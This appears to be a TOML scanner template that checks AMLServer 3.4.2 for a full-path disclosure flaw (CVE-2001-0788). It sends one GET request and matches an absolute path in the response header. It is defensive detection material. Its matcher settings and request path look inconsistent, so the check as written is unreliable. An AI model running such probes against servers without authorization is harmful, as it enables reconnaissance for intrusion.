[info]
author = "ave"
description = "AMLServer 3.4.2 完整路径泄露验证：发送 HTTP 请求并检查响应 Location 头，若返回绝对路径则确认漏洞存在"
id = "POC-AVE-2001-0354"
name = "CVE-2001-0788 PoC"
severity = "medium"
tags = ["ave-2001-0354"]
vuln_id = [
    "CVE-2001-0788",
    "AVE-2001-0354",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "header"
regex = ["^/[a-zA-Z0-9_/-]+$"]
type = "word"
words = ["/"]
